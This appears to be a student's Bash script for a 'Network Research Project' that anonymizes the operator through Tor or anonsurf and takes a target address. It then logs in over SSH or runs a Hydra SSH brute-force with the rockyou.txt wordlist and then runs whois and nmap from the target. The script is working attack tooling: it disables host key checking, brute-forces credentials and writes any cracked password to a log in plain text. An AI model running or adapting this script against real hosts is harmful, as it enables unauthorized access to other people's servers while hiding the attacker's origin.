#! /bin/bash

### Network Research Project ###
### Nissim Atar ###
### s17 ###
### JMagen773630 ###

#3.2 creating log file
log_file="/var/log/project1.log"


#function for log message
log_message()
{
        echo "$(date '+%Y-%m-%d %H:%M:%S') $1" >> "$log_file"
}

# 1.1 + 1.2 install apps function
function install_apps()
{
app=("nmap" "sshpass" "whois" "geoip-bin" "tor" "jq")
for app in "${app[@]}"
do
if dpkg -s "$app" | grep -i status
then 
        log_message "$app is installed."
        echo -e "\e[34m... $app is already installed ...\e[0m"
else
        log_message "$app is not installed"
        echo -e "\e[34m... $app is not installed, installing... ...\e[0m"
        sudo apt-get install $app -y
        log_message "$app is installed."
fi
done
}
# 1.3 function:  Check if the network connection is anonymous; if not, alert the user and exit
# option to install anonsurf
# Current user's IP address
function isAnon ()
{
IP=$(curl -s ifconfig.co)

# GeoIP for IP address
CNTRY=$(geoiplookup $IP | awk '{print $4}' | sed 's/,//g')
echo "$CNTRY"
echo "$IP"
# Check if IP is IL
if [ "$CNTRY" == "IL, Israel" ] || [ "$CNTRY" == "IL" ]; then
        echo -e "\e[34m... you are not anonymous ...\e[0m"
        log_message "anonymous check false"
        echo -e "\e[34m... do you wish to download, install and run anonsurf? yes/no ...\e[0m"        
        echo
        read ans
        echo
        if [ "$ans" == "yes" ]; then
		if ! dpkg -l | grep -q anonsurf; then
	                echo -e "\e[34m... updating and upgrading system. might take a moment... ...\e[0m"
        	        sleep 1.5
			sudo apt update && sudo apt upgrade
          	   	sudo echo "deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware" | sudo tee -a /etc/apt/sources.list
			sudo git clone https://github.com/Und3rf10w/kali-anonsurf
			sudo ./kali-anonsurf/installer.sh
			echo -e "\e[34m... DONE ...\e[0m"
			log_message "anonsurf downloaded"
		fi
                echo -e "\e[34m... anonsurf installed ...\e[0m"
                log_message "anonsurf installed"
                sudo anonsurf start
                echo -e "\e[34m... anonsurf started running ...\e[0m"
        fi
else
        echo -e "\e[34m... you are anonymous ...\e[0m"
        log_message "anonymous check true"
#1.4: display the spoofed country name
	echo "Spoofed Country: $(curl -s https://api.myip.com | grep -oP '(?<="country":")[^"]*')"
fi
}


#function - get adress and scan

function scanAdrs() {
    # 1.5: Get an address to scan
    echo -e "\e[34m... Please enter the address to scan (IP address or domain name): ...\e[0m"
    read scan_address
    echo -e "\e[34m... The address you entered is: $scan_address ...\e[0m"
    log_message "$scan_address entered for scan"

    # Resolve domain name to IP
    ip=$(dig +short "$scan_address" | tail -n1)
    if [[ -z "$ip" ]]; then
        ip="$scan_address"
    fi
    echo -e "\e[34m... Resolved IP address: $ip ...\e[0m"

    # 2: SSH Connection Loop
    while true; do
        echo -e "\e[34m... Do you have SSH access to this server? (yes/no): ...\e[0m"
        read ssh_access

        if [[ "$ssh_access" == "yes" ]]; then
            echo -e "\e[34m... Please enter server SSH username: ...\e[0m"
            read ssh_user
            echo -e "\e[34m... Please enter server SSH password: ...\e[0m"
            read -s spw  # Secure password input

            echo -e "\e[34m... Attempting SSH connection to $ssh_user@$ip ...\e[0m"

            # Determine OS Type
            os_type=$(sshpass -p "$spw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$ssh_user@$ip" 'uname -s 2>/dev/null')

            if [[ -z "$os_type" ]]; then
                os_type="Windows"
            fi

            # Execute Commands Based on OS
            if [[ "$os_type" == "Linux" ]]; then
                echo " Linux OS detected!"
                getInfoL "$ssh_user" "$ip" "$spw"
                break
            elif [[ "$os_type" == "Windows" ]]; then
                echo " Windows OS detected!"
                getInfoW "$ssh_user" "$ip" "$spw"
                break
            else
                echo -e "\e[31m Incorrect login details or unknown OS detected. Please try again.\e[0m"
                continue
            fi

        else
            # Ask the user if they want to try a brute-force process.
            echo -e "\e[34m... Do you want to try a brute-force process on $ip? (yes/no): ...\e[0m"
            read brute_choice
            if [[ "$brute_choice" != "yes" ]]; then
                echo -e "\e[34m... Brute-force process aborted by user.\e[0m"
                log_message "User opted not to brute-force attack on $ip"
                break
            fi

            # Ask for keywords to add to the wordlist.
            echo -e "\e[34m... Please type keywords to add to the wordlist (separated by spaces): ...\e[0m"
            read keywords
            echo -e "\e[34m... Initiating brute-force process with keywords: $keywords ...\e[0m"

            # Call the new bruteAtempt function with the keywords as arguments.
            bruteAtempt $keywords
            break
        fi
    done
}


#Get Info function for Windows

function getInfoW() {
    local user="$1"
    local ip="$2"
    local password="$3"

    if [[ -z "$user" || -z "$ip" || -z "$password" ]]; then
        echo "Usage: getInfoW <user> <IP> <password>"
        return 1
    fi

    echo -e "\e[34m... Connecting to Windows server: $ip ...\e[0m"

    # 1. Retrieve and display basic system info from the remote Windows server.
    local sysCmd="powershell -NoProfile -Command \"\
Write-Host 'Country:'; Invoke-RestMethod -Uri 'https://ipinfo.io/country'; \
Write-Host 'IP Address:'; (Get-NetIPAddress -AddressFamily IPv4 | Select-Object -ExpandProperty IPAddress); \
Write-Host 'Uptime:'; (New-TimeSpan -Start (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).ToString()\""

    sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        "$user@$ip" "$sysCmd"

    # 2. Perform WHOIS lookup and save output locally.
    # Note: In the else clause, we double the apostrophe in "couldn't" for a correct literal.
    local whoisCmd="powershell -NoProfile -Command \"\
if (Get-Command whois -ErrorAction SilentlyContinue) { \
    try { \$result = whois '$ip' 2>&1; Write-Output \$result } catch { Write-Output 'WHOIS lookup error:' \$_ } \
} else { Write-Output 'couldn''t get WHOIS info. it might not be installed' }\""

    sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        "$user@$ip" "$whoisCmd" > "whois_${ip}.txt"

    # 3. Check for NMAP. If found, use it; if not, use Get-NetTCPConnection as an alternative.
    local nmapCmd="powershell -NoProfile -Command \"\
if (Get-Command nmap -ErrorAction SilentlyContinue) { \
    try { \$result = nmap -p- --open '$ip' 2>&1; if (-not \$result) { Write-Output 'NMAP scan failed or returned no results.' } else { Write-Output \$result } } catch { Write-Output 'NMAP scan error:' \$_ } \
} else { \
    Write-Output 'NMAP command not found on remote Windows server. Using Get-NetTCPConnection as alternative.'; \
    try { \$result = Get-NetTCPConnection -State Listen | Format-Table -AutoSize | Out-String; Write-Output \$result } catch { Write-Output 'Error retrieving open ports:' \$_ } \
}\""

    sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        "$user@$ip" "$nmapCmd" > "nmap_${ip}.txt"

    # 4. Notify the user and log the file creation.
    echo -e "\e[34m WHOIS results saved locally as whois_${ip}.txt\e[0m"
    echo -e "\e[34m Open ports info saved locally as nmap_${ip}.txt\e[0m"
    log_message "WHOIS and open ports results saved locally for $ip"
}


#Get Info function  for Linux
function getInfoL() {
    local user="$1"
    local ip="$2"
    local password="$3"

    if [[ -z "$user" || -z "$ip" ]]; then
        echo "Usage: getInfoL <user> <IP> <password>"
        return 1
    fi

    echo -e "\e[34m... Connecting to $user@$ip to retrieve system information ...\e[0m"

    # Run commands remotely and capture the output
    system_info=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no -t "$user@$ip" '
        echo "Country: $(curl -s https://ipinfo.io/country)";
        echo "IP Address: $(hostname -I)";
        echo "Uptime: $(uptime -p)"
    ' 2>/dev/null)

    if [[ -z "$system_info" ]]; then
        echo -e "\e[31m Failed to retrieve system information. Please check the credentials or server status.\e[0m"
        log_message "Failed to retrieve system information from $ip."
        return 1
    fi

    # Extract values from the output
    shc=$(echo "$system_info" | grep "Country:" | awk '{print $2}')
    ship=$(echo "$system_info" | grep "IP Address:" | awk '{print $3}')
    shut=$(echo "$system_info" | grep "Uptime:" | cut -d ":" -f2-)

    # Display and log system details
    echo -e "\e[32m$system_info\e[0m"
    log_message "Server IP: $ship, Country: $shc, Uptime: $shut"

    # Run WHOIS and Nmap on the remote server and save the output locally
    echo -e "\e[34m... Running WHOIS and Nmap on the remote server ...\e[0m"
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no -t "$user@$ip" "whois $ip" > "whois_$ip.txt"
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no -t "$user@$ip" "nmap $ip" > "nmap_$ip.txt"

    echo -e "\e[34m WHOIS and Nmap results saved locally as whois_$ip.txt and nmap_$ip.txt\e[0m"
    log_message "WHOIS and Nmap results saved locally for $ip"
}

function bruteAtempt() {
    # This function uses:
    # - Global variable ip (the target server's IP)
    # - Keywords passed as arguments ($@)
    # - An existing username list in usernames.txt
    # - A base wordlist (rockyou.txt)
    #
    # It creates a temporary password file by appending the provided keywords
    # to the base wordlist, then uses hydra to try SSH logins.
    #
    # If a valid login is found, it detects the OS type and calls getInfoL (for Linux)
    # or getInfoW (for Windows). Otherwise, it notifies, logs the failure, and exits.

    # Check that the global variable ip is set
    if [[ -z "$ip" ]]; then
        echo "Error: Target IP is not set."
        return 1
    fi

    # Define the base wordlist location.
    local base_wordlist="/usr/share/wordlists/rockyou.txt"
    if [[ ! -f "$base_wordlist" ]]; then
        echo -e "\e[31mrockyou.txt not found in /usr/share/wordlists.\e[0m"
        echo -e "\e[34mWould you like to download rockyou.txt to the current directory? (yes/no):\e[0m"
        read download_choice
        if [[ "$download_choice" != "yes" ]]; then
            echo -e "\e[31mDownload aborted by user. Exiting bruteAtempt function.\e[0m"
            log_message "User declined to download rockyou.txt; bruteAtempt aborted on $ip"
            return 1
        fi

        # Download rockyou.txt using curl or wget to /usr/share/wordlists/
	if command -v curl >/dev/null 2>&1; then
   		 curl -L -o /usr/share/wordlists/rockyou.txt "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
	elif command -v wget >/dev/null 2>&1; then
    		wget -O /usr/share/wordlists/rockyou.txt "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
	else
    		echo -e "\e[31mNeither curl nor wget found. Cannot download rockyou.txt.\e[0m"
    		log_message "Download failed: neither curl nor wget found; bruteAtempt aborted on $ip"
    		return 1
	fi

       base_wordlist="/usr/share/wordlists/rockyou.txt"
       echo -e "\e[34mrockyou.txt downloaded to /usr/share/wordlists/rockyou.txt.\e[0m"
       log_message "rockyou.txt downloaded to /usr/share/wordlists/rockyou.txt; bruteAtempt continuing on $ip"
    fi

    # Define the temporary password file name.
    local temp_pwd_file="temp_wordlist_${ip}.txt"

    # Create the temporary wordlist by copying the base wordlist.
    cp "$base_wordlist" "$temp_pwd_file"

    # Append each provided keyword on its own line.
    for keyword in "$@"; do
        echo "$keyword" >> "$temp_pwd_file"
    done

    echo -e "\e[34m... Starting brute-force attempt on $ip using temporary wordlist $temp_pwd_file ...\e[0m"
    log_message "Starting brute-force attempt on $ip with keywords: $*"

    # Run Hydra with the username list (usernames.txt) and our temporary password list.
    local hydra_output_file="hydra_results_${ip}.txt"
    hydra -vV -L usernames.txt -P "$temp_pwd_file" -t 3 ssh://"$ip" -o "$hydra_output_file"
# > /dev/null 2>&1

    # Check if Hydra found any valid credentials by testing if the output file is non-empty.
    if [[ ! -s "$hydra_output_file" ]]; then
        echo -e "\e[31m Brute-force attack failed. No valid credentials found for $ip.\e[0m"
        log_message "Brute-force attack failed on $ip"
        rm -f "$temp_pwd_file" "$hydra_output_file"
        return 1
    fi

    # Parse Hydra's output for valid credentials.
    # Hydra output typically contains a line like:
    # [ssh] host: 192.168.126.128   login: admin   password: admin
    local creds_line
    creds_line=$(grep "login:" "$hydra_output_file")
    local found_user
    local found_pass
    found_user=$(echo "$creds_line" | awk '{for(i=1;i<=NF;i++){if($i=="login:") print $(i+1)}}')
    found_pass=$(echo "$creds_line" | awk '{for(i=1;i<=NF;i++){if($i=="password:") print $(i+1)}}')

    echo -e "\e[32m Successful login found: $found_user:$found_pass\e[0m"
    log_message "Successful brute-force login found: $found_user:$found_pass on $ip"

    # Determine OS type using the found credentials.
    local os_type
    os_type=$(sshpass -p "$found_pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$found_user@$ip" 'uname -s 2>/dev/null')

    if [[ -z "$os_type" ]]; then
        os_type="Windows"
    fi

    # Proceed with the appropriate function based on OS type.
    if [[ "$os_type" == "Linux" ]]; then
        echo -e "\e[34m Linux OS detected via brute-force credentials!\e[0m"
        getInfoL "$found_user" "$ip" "$found_pass"
    elif [[ "$os_type" == "Windows" ]]; then
        echo -e "\e[34m Windows OS detected via brute-force credentials!\e[0m"
        getInfoW "$found_user" "$ip" "$found_pass"
    else
        echo -e "\e[31m Unknown OS detected via brute-force credentials. Exiting.\e[0m"
        log_message "Brute-force login succeeded on $ip but OS detection failed."
        rm -f "$temp_pwd_file" "$hydra_output_file"
        return 1
    fi

    # Clean up temporary files.
    rm -f "$temp_pwd_file" "$hydra_output_file"
}



#Menu function
function Menu()
{
while true; do
	echo -e "\e[34m... MENU ...\e[0m"
	echo -e "\e[34m... type the number to execute: ...\e[0m"
	echo -e "1 - install Needed apps (will skip installation if not needed)"
	echo -e "2 - Check if I'm anonymous"
	echo -e "3 - Scan address" 
	echo -e "4 - Exit"
	read num
	
	if [ "$num" == "4" ]; then 
		break
	elif [ "$num" == "1" ]; then
		install_apps
	elif [ "$num" == "2" ]; then
		isAnon
	elif [ "$num" == "3" ]; then
		scanAdrs
	else
		echo -e "\e[34m... wrong number. try again ...\e[0m"
	fi
done
}

#calling Menu Function
Menu

# 3.2 Log data collection
echo -e "\e[34m... Data collection log: ...\e[0m"
echo -e "\e[34m... Script ended on: $(date) ...\e[0m"

# Closing the log file
exec > /dev/tty 2>&1

### Network Research Project ###
### Nissim Atar ###
### s17 ###
### JMagen773630 ###
